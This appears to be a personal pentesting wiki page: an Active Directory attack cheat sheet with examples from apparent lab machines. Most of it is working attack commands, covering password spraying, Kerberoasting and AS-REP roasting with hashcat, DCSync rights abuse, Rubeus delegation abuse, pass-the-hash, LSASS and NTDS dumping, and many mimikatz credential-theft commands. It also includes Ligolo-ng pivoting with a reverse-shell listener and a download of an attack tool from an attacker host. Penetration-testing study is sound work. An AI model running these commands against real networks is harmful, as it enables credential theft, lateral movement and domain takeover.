---
layout: wiki
title: Internals - Active Directory Resources
cate1: Internal
cate2: Active Directory
description: Notes about Active Directory
keywords: Internals
---

# Useful Resources
  - **[Wadcoms - Interactive Cheat Sheet for Active Directory](https://wadcoms.github.io/)**
  - **[Active Directory Enumeration Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)**

-----------------------------------------------------------------------

# Initial Access

## Password Spraying
**[Password Spraying via Sprayhound](https://github.com/Hackndo/sprayhound)**
  - Checks badpwdcount attribute only in the domain policy

**Additional Resources**
  - [DomainPasswordSpray](https://github.com/dafthack/DomainPasswordSpray)
  - [Invoke-CleverSpray](https://github.com/wavestone-cdt/Invoke-CleverSpray)
  - [Spray](https://github.com/Greenwolf/Spray)

## Rid Brute via SMB
**[Rid Brute via SMB](https://medium.com/@e.escalante.jr/active-directory-workshop-brute-forcing-the-domain-server-using-crackmapexec-pt-6-feab1c43d970)**

**Requires:** Guest read access to IPC$ (Remote IPC) SMB File Share 
```
nxc smb 10.10.10.192 -u 'guest' -p '' --rid-brute > sid.txt
cat sid.txt | awk -F': ' '{print $2}' | awk '{print $1}' | sed 's/[DOMAIN]\\//' > users.txt
GetNPUsers.py [DOMAIN]/ -usersfile users.txt -format hashcat
hashcat -m 18200 creds.txt /usr/share/wordlists/rockyou.txt
```

## LDAP Enumeration
**[LDAPSearch Enumeration](https://notes.benheater.com/books/active-directory/page/ldapsearch)**

```
ldapsearch -x -H ldap://BLACKFIELD -s base namingcontexts (Domain Contexts)
ldapsearch -x -H ldap://BLACKFIELD -D 'CN=support,CN=users,DC=BLACKFIELD,DC=local' -W -b 'DC=BLACKFIELD,DC=local' '(objectClass=user)' (Search Users)
ldapsearch -H ldap://192.168.110.55 -x -D "web_svc@painters.htb" -W -b "dc=painters,dc=htb" "(msDS-AllowedToDelegateTo=*)" msDS-AllowedToDelegateTo (Constrained Delegation)
```

**[LDAP Domain Dump via Linux](https://github.com/dirkjanm/ldapdomaindump)**
  - Old tool however useful if Bloodhound.py isn't working as intended.

**Additional resources**
  - [Useful LDAP queries](https://podalirius.net/en/articles/useful-ldap-queries-for-windows-active-directory-pentesting/)

## SMB - Share Enumeration
**[SMB - Share Enumeration](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**
```
nxc smb [IP] --shares
```

**Additional Resources**
  - [BIWasp/NetExec cheat sheet](https://github.com/BlWasp/NetExec-Cheatsheet)
  - [SMB Enumeration cheat sheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)
  - [CrackMapExec + NetExec cheat sheet](https://github.com/seriotonctf/cme-nxc-cheat-sheet)

## Web Application Vulnerabilities
**[Bad PDF](https://github.com/deepzec/Bad-Pdf)**

**Additional Resources**
  - [Malicious PDF](https://github.com/jonaslejon/malicious-pdf)

## Integrated DNS Dump
[Integrated DNS Dump](https://github.com/dirkjanm/adidnsdump)**

Any user in Active Directory can enumerate all DNS records in the Domain or Forest DNS zones, similar to a zone transfer.

Additional Resources:
  - [ADIDNS Dump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

-----------------------------------------------------------------------

# Domain Enumeration

## Impacket (via Python)
**[Enumeration via Impacket](https://github.com/fortra/impacket)**
  - GetADUsers.py

## Bloodhound
**[BloodHound CE](https://github.com/SpecterOps/BloodHound)**

```
curl -L https://ghst.ly/getbhce | docker compose -f - up
```

**Additional Resources** 
  - [BloodHound Community Edition](https://support.bloodhoundenterprise.io/hc/en-us/articles/17468450058267-Install-BloodHound-Community-Edition-with-Docker-Compose)
  - [BloodHound Cypher Cheatsheet](https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/)

**[BloodHound.py for Linux](https://github.com/dirkjanm/BloodHound.py)**

**Additional Resources**
  - [BloodHound.py for Bloodhound CE version](https://github.com/dirkjanm/BloodHound.py/tree/bloodhound-ce)

```
python3 bloodhound.py -u "support" -p "#00^BlackKnight" -c ALL -d BLACKFIELD.local -ns 10.10.10.192 -dc dc01.BLACKFIELD.local
proxychains bloodhound-python -u "web_svc"  -d 'painters.htb' -dc 'dc.painters.htb' --dns-tcp -c ALL -v -ns 192.168.110.55 [proxychains equivalent]
```

-----------------------------------------------------------------------

# Poisoning and Relay
## Responder
**[Responder](https://github.com/lgandx/Responder)**
  - IPv6/IPv4 LLMNR/NBT-NS/mDNS Poisoner and NTLMv1/2 Relay.

```
hashcat -m 5600 --force -a 0 responder.hashes /usr/share/wordlists/rockyou.txt
/opt/tools/Responder/ (location of Responder)
```

## SMB Relay 
**[SMB Relay]**
```
nxc smb [IP] --gen-relay-list relay.txt
```

-----------------------------------------------------------------------

# Domain Privilege Escalation
## ASREPRoasting
**[ASREPRoasting via Impacket](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/asreproast)**

**Targets:** If a domain user account do not require kerberos preauthentication, we can request a valid TGT for this account without even having domain credentials, extract the encrypted blob and bruteforce it offline.

## Kerberoasting
**[Kerberoasting](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/kerberoast)**

**Requires:** Domain Credentials

**Targets:** Service Accounts with SPNs registered on the domain to retrieve TGS tickets containing the SPN hashes.

```
GetUserSPNs.py -request active.htb/SVC_TGS:GPPstillStandingStrong2k18 -dc-ip 10.10.10.100
GetUserSPNs.py -request 'painters.htb/riley':'P@ssw0rd' -dc-ip 192.168.110.55 -debug -dc-host PAINTERS.HTB
hashcat -m 13100 --force -a 0 kerberoasting.hashes /usr/share/wordlists/rockyou.txt --force
```

## WriteDACL
**[WriteDACL - BloodHound](https://support.bloodhoundenterprise.io/hc/en-us/articles/17312765477787-WriteDacl)**

## Active Directory ACLs/ACEs
**[Abusing Active Directory ACLs/ACEs](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse)**

## NTLMRelay
**[NTLMRelay](https://www.thehacker.recipes/ad/movement/ntlm/relay)**

## DCSync
**[DCSync - secretsdump](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/dcsync)**

**With PowerView**:
```
whoami /all
Add-ADGroupMember -Identity "Exchange Windows Permissions" -members svc-alfresco
net group "Exchange Windows Permissions" /add svc-alfresco
Add-DomainObjectAcl -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity svc-alfresco -Rights DCSync
Add-ObjectACL -PrincipalIdentity test123 -Credential $cred -Rights DCSync
Get-DomainUser -Identity svc-alfresco
Get-ObjectAcl -DistinguishedName "DC=htb,DC=local" -ResolveGUIDs | Where-Object { $_.IdentityReference -match "svc-alfresco" }
```

## SYSVOL Group Policy Credential Mining
**[SYSVOL Group Policy Credential Mining](https://adsecurity.org/?p=2288)**

## Constrained Delegation
**[Constrained Delegation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/constrained-delegation)**

```
Rubeus.exe dump /luci:0x599ac7 /service:CIFS/dc.painters.htb /nowrap /outfile [dump to kirbi files]
Rubeus.exe asktgt /user:blake /password:Password123! /domain:PAINTERS.HTB /dc:192.168.110.55 [request for TGT using credentials]
Rubeus.exe ptt /ticket:test.kirbi (import ticket)
Rubeus.exe tgtdeleg /user:blake /password:Password123! /domain:PAINTERS.HTB /target:CIFS/dc.painters.htb /nowrap (ticket delegation with TGT to obtain TGS of target service)
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:"CIFS/dc.painters.htb" /user:blake /ticket:test.kirbi /nowrap (Access to CIFS/dc.painters.htb)


**For Linux use:**
base64 -d ticket.kirbi.b64 > ticket.kirbi
ticketConverter.py cifs.kirbi cifs.ccache
export KRB5CCNAME=cifs.ccache
sudo apt-get install krb5-user

OR

getST.py -spn "cifs/dc.painters.htb" -impersonate "administrator" "painters/blake:Password123\!" -dc-ip 192.168.110.55
```

**What if we have delegation rights for only a spesific SPN? (e.g TIME):**

In this case we can still abuse a feature of kerberos called "alternative service". This allows us to request TGS tickets for other "alternative" services and not only for the one we have rights for. Thats gives us the leverage to request valid tickets for any service we want that the host supports, giving us full access over the target machine.

**Additional Resources**
  - [Using altservice to generate LDAP TGS](https://medium.com/r3d-buck3t/attacking-kerberos-constrained-delegations-4a0eddc5bb13#3276)

-----------------------------------------------------------------------

# Lateral Movement

## ForceChangePassword
**[ForceChangePassword](https://www.thehacker.recipes/ad/movement/dacl/forcechangepassword)**

**Requires:** `GenericAll`, `AllExtendedRights` or `User-Force-Change-Password` on Object

```
net rpc password AUDIT2020 -U BLACKFIELD\\support -S BLACKFIELD.local (prompts new password)

$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('CONTOSO\\dfm.a', $SecPassword)
$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword -Credential $Cred (optional $Cred)
```

**Additional Resources**
  - [BloodHound ForceChangePassword](https://support.bloodhoundenterprise.io/hc/en-us/articles/17223286750747-ForceChangePassword)

## Pass The Hash
**[Pass The Hash](https://swisskyrepo.github.io/InternalAllTheThings/active-directory/hash-pass-the-hash/#references)**
```
evil-winrm -u James -H 8af1903d3c80d3552a84b6ba296db2ea -i 192.168.110.53 (obtain through mimikatz dump)
  - Sometimes you can compromise the WinRM, and then create a new administrator account to psexec into to access domain.
```

## SeDebugPrivilege Add New Administrative User
**[SeDebugPrivilege Add New Administrative User](https://github.com/bruno-1337/SeDebugPrivilege-Exploit)**

## Credential Dumping
**[LSASS Dump - lsass.DMP](https://medium.com/@markmotig/some-ways-to-dump-lsass-exe-c4a75fdc49bf)**

**Requires:** Credential Guard to be disabled.

```
Dumping LSASS via Linux: https://medium.com/@offsecdeer/dumping-lsass-remotely-from-linux-efc47391e56d
```

**[Dumping Local SAM](https://www.ired.team/offensive-security/credential-access-and-credential-dumping/dumping-hashes-from-sam-registry)**
  - Crack SAM hashes: https://sanjumalhotra26.medium.com/dumping-credentials-from-sam-file-using-mimikatz-and-cracking-with-john-the-ripper-and-hashcat-ce5bbf2f4f5a

**[Pypykatz - Mimikatz for Linux](https://github.com/skelsec/pypykatz)**

**Requires:** A DMP file containing credentials extracted to our Linux machine.
```
pypykatz lsa minidump lsass.DMP
```

## Backup Operator
**[Backup Operator - Privilege Escalation](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/privileged-groups-and-token-privileges#backup-operators)**
```
whoami /all (SeBackupPrivilege Enabled)

diskshadow /s backup.txt
robocopy /b E:\Windows\ntds . ntds.dit (NTDS file)
reg save hklm\system c:\temp\system.bak (System Hive keys)

## Other Resources
https://medium.com/r3d-buck3t/windows-privesc-with-sebackupprivilege-65d2cd1eb960#ac58
```

-----------------------------------------------------------------------

# Active Directory Tools
**[NetExec](https://github.com/Pennyw0rth/NetExec)**
```
curl --proto '=https' --tlsv1.2 -sSf https://sh.rustup.rs | sh (install Rust)
source $HOME/.cargo/env
pipx install git+https://github.com/Pennyw0rth/NetExec
```

**[PowerView (Deprecated since 2021)](https://github.com/PowerShellMafia/PowerSploit/blob/dev/Recon/PowerView.ps1)**
```
. .\powerview.ps1
Import-Module C:\Temp\PowerView.ps1
```

**NSE**
```--script smb-os-discovery,smb-enum-shares,smb-enum-users,smb-vuln*```

**SMB**
Enum4Linux
SMBMap
smbclient
smbclient.py (Impacket)
**[NetExec - Cheatsheet](https://github.com/BlWasp/NetExec-Cheatsheet)**
**[SMB Enumeration Cheatsheet](https://0xdf.gitlab.io/2024/03/21/smb-cheat-sheet.html)**

**WinRM**
**[Evil-WinRM](https://github.com/Hackplayers/evil-winrm)**
```
evil-winrm -i 10.10.10.192 -u "svc_backup" -H "9658d1d1dcd9250115e2205d9f48400d"
```

**[Impacket]()**
```
python3 -m pipx install impacket
  - **PSExec**
    - Shell access via SMB shares (Pass the Hash) 
  - **GetNPUsers**
    - Kerberos Pre-authentication disabled (ASREPRoasting)

smbclient.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb -debug
wmiexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
psexec.py -k -no-pass PAINTERS.HTB/Administrator@dc.painters.htb
```

**[Network Pivoting - Ligolo-ng](https://software-sinner.medium.com/how-to-tunnel-and-pivot-networks-using-ligolo-ng-cf828e59e740)**

```
./agent -connect 10.10.14.5:443 -ignore-cert
sudo ./proxy -selfcert -laddr 0.0.0.0:443 -v
session
start
sudo ip route add 192.168.110.0/24 dev ligolo

listener_add --addr 0.0.0.0:1234 --to 0.0.0.0:4444 (open port on DMZ machine for reverse shell)

powershell -Command "Invoke-WebRequest -Uri 'http://192.168.110.51:1235/Rubeus.exe' -OutFile 'Rubeus.exe'"
```
**Additional Resources**
  - [Ligolo Guide for pivoting](https://systemweakness.com/pivoting-for-newbies-with-ligolo-ng-82f13040aa39)
  - [Advanced pivoting guide](https://arth0s.medium.com/ligolo-ng-pivoting-reverse-shells-and-file-transfers-6bfb54593fa5)

**[Rubeus for Windows](https://github.com/r3motecontrol/Ghostpack-CompiledBinaries)**

**[Pywerview - Linux AD Enumeration](https://github.com/the-useless-one/pywerview)**

**[Empire - Post-exploitation Framework](https://github.com/BC-SECURITY/Empire)**


**[Mimikatz](https://github.com/gentilkiwi/mimikatz/releases)**

```
#Dump LSASS:
mimikatz privilege::debug
mimikatz token::elevate
mimikatz sekurlsa::logonpasswords

#(Over) Pass The Hash
mimikatz privilege::debug
mimikatz sekurlsa::pth /user:<UserName> /ntlm:<> /domain:<DomainFQDN>

#List all available kerberos tickets in memory
mimikatz sekurlsa::tickets

#Dump local Terminal Services credentials
mimikatz sekurlsa::tspkg

#Dump and save LSASS in a file
mimikatz sekurlsa::minidump c:\temp\lsass.dmp

#List cached MasterKeys
mimikatz sekurlsa::dpapi

#List local Kerberos AES Keys
mimikatz sekurlsa::ekeys

#Dump SAM Database
mimikatz lsadump::sam

#Dump SECRETS Database
mimikatz lsadump::secrets

#Inject and dump the Domain Controler's Credentials
mimikatz privilege::debug
mimikatz token::elevate
mimikatz lsadump::lsa /inject

#Dump the Domain's Credentials without touching DC's LSASS and also remotely
mimikatz lsadump::dcsync /domain:<DomainFQDN> /all

#Dump old passwords and NTLM hashes of a user
mimikatz lsadump::dcsync /user:<DomainFQDN>\<user> /history

#List and Dump local kerberos credentials
mimikatz kerberos::list /dump

#Pass The Ticket
mimikatz kerberos::ptt <PathToKirbiFile>

#List TS/RDP sessions
mimikatz ts::sessions

#List Vault credentials
mimikatz vault::list
```

**Additional Resources**
  - [Mimikatz Post Exploitation Basics](https://infosecwriteups.com/post-exploitation-basics-in-active-directory-enviorment-by-hashar-mujahid-d46880974f87)
  - [Mimikatz Guide Reference](https://adsecurity.org/?page_id=1821)


**[Wordlists](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/hash-cracking/#hashcat-install)**

## Resources
 - [The Hacker Recipes](https://www.thehacker.recipes/)
 - [Active Directory Exploitation Cheat Sheet](https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet)
 - [InternalAllTheThings](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/)
